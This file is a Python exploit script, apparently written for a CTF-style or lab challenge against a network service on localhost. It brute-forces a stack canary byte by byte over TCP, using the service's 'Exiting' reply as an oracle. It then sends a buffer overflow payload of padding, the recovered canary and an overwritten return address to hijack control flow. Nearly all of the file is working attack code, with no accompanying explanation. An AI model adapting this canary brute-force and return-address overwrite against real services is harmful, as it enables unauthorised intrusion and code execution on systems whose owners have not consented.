import socket
import sys

# Get port from argv
port = int(sys.argv[1])

# Define the server address and port
server_address = ('localhost', port)

prompt = b'> \x00'

garbage = 24 * b"A"
# garbage = 0x6f63206568742065.to_bytes(8, byteorder='little') + 0x6e6f697463656e6e.to_bytes(8, byteorder='little') + 0x00000000000a0a29.to_bytes(8, byteorder='little')
bridge = 8 * b"B"
# bridge = 0x0000000000000000.to_bytes(8, byteorder='little')


# Try the bruteforcing method by sending 32 garbage bytes and then byte by byte the canary
# Send exit after to performa a return
canary = b""
while len(canary) < 8:
    print("--- Trying to find byte ", len(canary))
    found = 0
    for i in range(256):
        
        # Create a TCP socket without with
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(server_address)
        welcome = sock.recv(2048)
        while prompt not in welcome:
            welcome += sock.recv(2048)
        
        ping = garbage + canary + bytes([i])
        # print("Sending: ", ''.join(f'\\x{byte:02x}' for byte in ping))
        sock.send(ping)
        echo = sock.recv(2048)
        while prompt not in echo:
            echo += sock.recv(2048)
    
        sock.send(b'exit\n')
        final = sock.recv(2048)
        sock.close()
        if b'Exiting' in final:
            canary += bytes([i])
            print("Found byte: ", i, "canary is now: ", ''.join(f'\\x{byte:02x}' for byte in canary))
            break
    
# Send the return address with intact canary    
input("Press Enter to continue...")
# return_address = (0x401682).to_bytes(8, byteorder='little')
return_address = (0x40168c).to_bytes(8, byteorder='little') # go a few operations further to avoid subtracting 8 from rsp, causing stack misalignment later

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server_address)
welcome = sock.recv(2048)
while prompt not in welcome:
    welcome += sock.recv(2048)

ping = garbage + canary + bridge + return_address
print("Sending: ", ''.join(f'\\x{byte:02x}' for byte in ping))
sock.send(ping)
echo = sock.recv(2048)
while prompt not in echo:
    echo += sock.recv(2048)

sock.send(b'exit\n')
final = sock.recv(2048)
sock.close()